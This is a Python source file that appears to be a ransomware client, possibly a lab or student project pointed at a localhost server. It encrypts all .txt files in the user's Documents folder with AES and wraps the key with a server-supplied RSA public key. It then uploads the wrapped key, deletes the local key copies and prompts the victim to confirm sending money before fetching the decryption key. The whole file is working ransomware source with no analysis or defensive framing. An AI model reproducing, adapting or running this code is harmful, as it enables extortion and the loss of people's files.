import random
import string
import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import requests
import csv
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, send_file
from typing import ByteString
import logging
import time

# Set up a basic logger with INFO level
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_key() -> str:
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    print(f"Key: {key} was generated successfully")
    return key

def save_to_file(content: str, file_name: str) -> None :
    # Get the current directory
    current_dir = os.getcwd() # os.path.dirname(os.path.abspath(__file__))
    # Create the folder name
    folder_name = "ClientFiles"
    # Create the full path of the file
    file_path = os.path.join(current_dir, folder_name, file_name)
    # Save the file
    with open(file_path, "w") as f:
        f.write(content)
    print(f"{file_name} file was created successfully")

def encrypt_files(key: str) -> None:
    home_directory = os.path.expanduser("~")
    directory = os.path.join(home_directory, "Documents")
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)

                # opening file in directory
                with open(file_path, 'rb') as f:
                    plaintext = f.read()

                # generating ciphertext using AES encryption and previously generated key
                block_size = 16
                padded_plaintext = plaintext + (block_size - len(plaintext) % block_size) * b"\0"
                ciphertext = AES.new(key.encode(), AES.MODE_ECB).encrypt(padded_plaintext)

                # writing ciphertext in file
                with open(file_path, 'wb') as f:
                    f.write(ciphertext)
    print("files were encrypted successfully")

def decrypt_files(key: str) -> None:
    home_directory = os.path.expanduser("~")
    directory = os.path.join(home_directory, "Documents")
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)

                # opening file in directory
                with open(file_path, 'rb') as f:
                    ciphertext = f.read()

                # generating plaintext using AES decryption and previously generated key
                print(f"Key used for decryption is {key}")
                plaintext = AES.new(key, AES.MODE_ECB).decrypt(ciphertext)
                # Remove the padding from the plaintext
                plaintext = plaintext.rstrip(b"\0")

                # writing plaintext in file
                with open(file_path, 'wb') as f:
                    f.write(plaintext)
    print("files were decrypted successfully")

def get_rsa_public_key() -> ByteString:
    try:
        response = requests.get('http://localhost:5000/getRSAPublicKey')
        if response.status_code == 200:
            rsa_public_key = response.content
            logger.info("RSA public key was received successfully")
            return rsa_public_key
        else:
            logger.error(f"Request failed with status code {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Request error: {e}")
        return None

def get_decrypted_key_after_sending_money():
    try:
        response = requests.get('http://localhost:5000/get_decrypted_key_after_sending_money')
        print(response.content)
        if response.status_code == 200:
            decrypted_key = response.content
            logger.info("Decrypted key was received successfully")
            return decrypted_key
        else:
            logger.error(f"Request failed with status code {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        logger.error(f"Request error: {e}")
        return None

def encrypt_key_using_rsa_public_key(key: str, rsa_public_key: ByteString):
    # Log a message
    logger.info("Encrypting key using RSA public key...")
    # Convert the byte string to an RSA key object
    rsa_public_key = RSA.importKey(rsa_public_key)
    # Encrypt the key using the RSA key object
    return PKCS1_OAEP.new(rsa_public_key).encrypt(key.encode())

def send_encrypted_key():
    current_dir = os.getcwd() # os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_dir, "ClientFiles", "encryptedKey.key")
    with open(file_path, 'rb') as f:
        r = requests.post('http://localhost:5000/upload', files={'file': f})
    print("encryptedKey.key file was sent successfully")

def delete_file(file_path) -> None:
    if (os.path.isfile(file_path)):
        os.remove(file_path)

def delete_client_keys():
    current_dir = os.getcwd() # os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_dir, "ClientFiles", "encryptedKey.key")
    delete_file(file_path)
    file_path = os.path.join(current_dir, "ClientFiles", "Key.key")
    delete_file(file_path)
    print("Client keys were deleted successfully")

def main():
    key = generate_key()
    save_to_file(key, "Key.key")
    encrypt_files(key)
    rsa_public_key = get_rsa_public_key()
    # we encrypt the AES secret key using the server's rsa public key, so that only
    # the server can derypt and read the AES secret key
    encrypted_key = encrypt_key_using_rsa_public_key(key, rsa_public_key)
    current_dir = os.getcwd() # os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_dir, "ClientFiles", "encryptedKey.key")
    with open(file_path, "wb") as f:
        f.write(encrypted_key)
    print("encryptedKey.key file was created successfully")
    send_encrypted_key()
    delete_client_keys() 

    while True:
        print("If you have sent the money write 'done'")
        if input() == "done":
            key = get_decrypted_key_after_sending_money()
            decrypt_files(key)
            break

if __name__ == "__main__":
    main()